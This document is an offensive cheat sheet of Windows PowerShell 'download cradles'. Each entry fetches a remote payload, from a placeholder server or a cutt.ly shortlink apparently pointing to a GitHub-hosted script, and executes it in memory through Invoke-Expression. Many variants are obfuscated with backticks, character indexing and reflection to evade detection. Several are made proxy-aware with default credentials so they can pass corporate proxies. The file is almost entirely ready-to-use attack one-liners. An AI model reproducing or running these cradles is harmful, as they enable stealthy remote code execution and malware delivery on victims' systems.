# Not proxy aware download cradles, which can be executed in a Windows PowerShell (powershell.exe)  
# Windows PowerShell default download cradle not proxy aware
ps> IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")

# Windows PowerShell lightly obfuscated Cradle not proxy aware
ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
ps> i`EX (    neW-o`BJE`cT N`ET.`weBcl`IeNT    )."do`wnLO`ADS`TRinG"(    "http://server/payload.ps1"   )

# Windows PowerShell heavily obfuscated Cradle not proxy aware
ps> $ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://server/payload.ps1'))-Join''))}
ps> &( ([String]''.Normalize)[3,45,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')
ps> $url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url)|Invoke-Expression
ps> $url='http://server/payload.ps1';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';IEX($wc.$ds.Invoke($url))
ps> &( ([String]''.Normalize)[23,15,46]-Join'')(([Char[]](New-Object Net.WebClient).DownloadData('http://server/payload.ps1'))-Join'')
ps> $ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-clike'*S*i*t'}).Name).Invoke((New-Object Net.WebClient).DownloadString('http://server/payload.ps1'))


# Proxy aware download cradles
# Info: I use a shortcut link to the raw link from your hosted payload on Github
# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github

# Windows PowerShell default download cradle proxy aware
ps> $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $c.downloadstring("https://cutt.ly/syFzILH")

# Windows PowerShell obfuscated cradle proxy aware
ps> (New-Object Net.WebClient).DownloadString('https://cutt.ly/syFzILH')|.$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCmdlet($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*man*Name'}).Name).Invoke('*ke-*pr*',1,$TRUE))

# Windows PowerShell obfuscated cradle proxy aware
ps> $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`E`x $c.downloadstring("ht"+"tps://cutt.ly/syFzILH")
